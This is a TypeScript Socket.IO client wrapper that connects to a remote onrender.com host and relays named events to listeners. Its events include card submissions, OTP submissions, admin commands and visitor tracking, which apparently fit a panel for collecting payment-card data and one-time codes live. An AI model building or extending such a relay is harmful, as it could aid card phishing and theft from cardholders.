import io from 'socket.io-client';

const isLocalhost = window.location.hostname === "localhost" || window.location.hostname === "127.0.0.1";
const protocol = window.location.protocol === "https:" ? "wss" : "ws";
const wsUrl = isLocalhost
  ? `${protocol}://localhost:8080`
  : `wss://maniax49.onrender.com`;

class WSClient {
  private listeners: { [type: string]: Array<(payload: any) => void> } = {};
  socket: any;

  constructor() {
    this.socket = io(wsUrl, { withCredentials: true, transports: ['websocket', 'polling'] } as any);
    
    this.socket.on('connect', () => {
      console.log('Socket.IO connected');
    });

    this.socket.on('disconnect', () => {
      console.log('Socket.IO disconnected');
    });

    // Listen for all relayed events
    const RELAY_EVENTS = [
      'card_submission',
      'admin_command',
      'otp_submitted',
      'delete_all_transactions',
      'visitor_update',
      'visitor_left',
      'start_chat',
      'chat_message'
    ];

    RELAY_EVENTS.forEach((event) => {
      this.socket.on(event, (payload) => {
        console.log(`Received event: ${event}`, payload);
        if (this.listeners[event]) {
          this.listeners[event].forEach((cb) => cb(payload));
        }
      });
    });
  }

  send(type: string, payload: any) {
    console.log(`Sending event: ${type}`, payload);
    this.socket.emit(type, payload);
  }

  connect() {
    if (!this.socket.connected) {
      this.socket.connect();
    }
  }

  disconnect() {
    if (this.socket.connected) {
      this.socket.disconnect();
    }
  }

  getSocketId() {
    return this.socket.id;
  }

  on(type: string, cb: (payload: any) => void) {
    console.log(`Registering listener for ${type}`);
    if (!this.listeners[type]) this.listeners[type] = [];
    this.listeners[type].push(cb);
  }

  off(type: string, cb: (payload: any) => void) {
    console.log(`Removing listener for ${type}`);
    if (this.listeners[type]) {
      this.listeners[type] = this.listeners[type].filter((fn) => fn !== cb);
    }
  }
}

export const wsClient = new WSClient();
